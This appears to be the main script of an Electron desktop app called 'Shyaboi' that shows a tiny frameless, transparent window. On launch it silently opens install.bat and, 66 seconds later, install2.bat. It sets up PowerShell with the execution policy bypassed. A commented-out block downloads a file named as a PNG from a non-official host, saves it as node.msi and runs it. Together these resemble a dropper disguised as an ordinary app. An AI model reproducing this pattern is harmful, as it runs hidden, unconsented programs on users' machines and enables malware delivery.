const { app, BrowserWindow } = require("electron");
const path = require("path");
require("electron-reload")(__dirname);
// ./main.js
const contextMenu = require("electron-context-menu");
const { shell } = require("electron");
const { exec, spawn } = require("child_process");
const Shell = require('node-powershell');

// Add an item to the context menu that appears only when you click on an image
// contextMenu({
// 	prepend: (params, browserWindow) => [{
//     label: 'Rainbow',

// 		// Only show it when right-clicking images
// 		visible: params.mediaType === 'image'
//   },
//   {
//     role: "zoomIn"
//     // If you want to change the label "Zoom In"
//     // label: "Custom Zoom In Text"
// },
// {
//   role: "zoomOut"
//   // If you want to change the label "Zoom Out"
//   // label: "Custom Zoom Out Text"
// },
// {
//   role: "reload"
//   // If you want to change the label "Zoom Out"
//   // label: "Custom Zoom Out Text"
// },
// {
//   role: "selectAll"
//   // If you want to change the label "Zoom Out"
//   // label: "Custom Zoom Out Text"
// },
// ]
// });

// Your code that starts a new application
let win;
(async () => {
  await app.whenReady();
})();

function createWindow() {
  // Create the browser window.
  // shell.openExternal('https://github.com')
  shell.beep();
  console.log(process.platform);
  const userOS = process.platform;
  if (userOS === "win32") {
    const ps = new Shell({
      executionPolicy: 'Bypass',
      noProfile: true
    });

    const ps2 = new Shell({
      executionPolicy: 'Bypass',
      noProfile: true
    });
     
    // ps.addCommand('./install.bat');
    // ps.invoke()
    // .then(output => {
    //   console.log(output);
    // })
    // .catch(err => {
    //   console.log(err);
    // });
// setTimeout(() => {
//   ps2.addCommand('./mkdirtwo.ps1');
//   ps2.invoke()
//   .then(output => {
//     console.log(output);
//   })
//   .catch(err => {
//     console.log(err);
//   });
// }, 90000);

    // shell.openItem("mkdir.sh")
    // exec("echo you using wandows", (err, stdout, stderr) => {
    //   if (err) {
    //     console.error(err);
    //     return;
    //   }
    //   console.log(stdout);
    // });
    // exec("node -v", (err, stdout, stderr) => {
    //   if (err) {
    //     console.error(err);
    //     return;
    //   }
    //   const donuis = Number(stdout.slice(1, 3));
    //   if (donuis >= 15) {
    //     console.log("you got node, you good");
    //   } else {
    //     console.log("downloading node via curl");
    //     var thing =
    //       "curl -o node.msi 'http://dinguscrew.com:8080/Walls131498370195215.png'";
    //     exec(
    //       "curl -o node.msi https://nodejs.org/dist/v12.18.3/node-v12.18.3-x64.msi",
    //       (err, stdout, stderr) => {
    //         if (err) {
    //           console.error(err);
    //           return;
    //         }
    //         exec("start node.msi", (err, stdout, stderr) => {
    //           if (err) {
    //             console.error(err);
    //             return;
    //           }
    //           console.log(stdout);
    //         });
    //         console.log(stdout);
    //         exec("echo don node via curl", (err, stdout, stderr) => {
    //           if (err) {
    //             console.error(err);
    //             return;
    //           }
    //           console.log(stdout);
    //         });
    //       }
    //     );
    //   }
    //   console.log(typeof donuis);
    // });
  }
  // exec('chmod 755 mkdir.sh', (err, stdout, stderr) => {
  //   if (err) {
  //     console.error(err);
  //     return;
  //   }
  //   console.log(stdout);
  // });
  // exec('mkdir.sh', (err, stdout, stderr) => {
  //   if (err) {
  //     console.error(err);
  //     return;
  //   }
  //   console.log(stdout);
  // });

  // exec('echo things', (err, stdout, stderr) => {
  //   if (err) {
  //     console.error(err);
  //     return;
  //   }
  //   console.log(stdout);
  // });
shell.openItem("install.bat")

const dinus = ()=> {shell.openItem("install2.bat")}


  setTimeout(() => {
  dinus()
  }, 66000);

  const mainWindow = new BrowserWindow({
    title: "Shyaboi",
    icon: __dirname + "./sinbad.png",
    // frame: false,
    // titleBarStyle: 'customButtonsOnHover',
    transparent: true,
    frame: false,
    width: 450,
    height: 100,
    webPreferences: {
      preload: path.join(__dirname, "preload.js"),
    },
  });

  // and load the index.html of the app.
  mainWindow.loadFile("index.html");

  // Open the DevTools.
  // mainWindow.webContents.openDevTools()
}

// This method will be called when Electron has finished
// initialization and is ready to create browser windows.
// Some APIs can only be used after this event occurs.
app.whenReady().then(createWindow);

// Quit when all windows are closed.
app.on("window-all-closed", function () {
  // On macOS it is common for applications and their menu bar
  // to stay active until the user quits explicitly with Cmd + Q
  if (process.platform !== "darwin") app.quit();
});

app.on("activate", function () {
  // On macOS it's common to re-create a window in the app when the
  // dock icon is clicked and there are no other windows open.
  if (BrowserWindow.getAllWindows().length === 0) createWindow();
});

// In this file you can include the rest of your app's specific main process
// code. You can also put them in separate files and require them here.
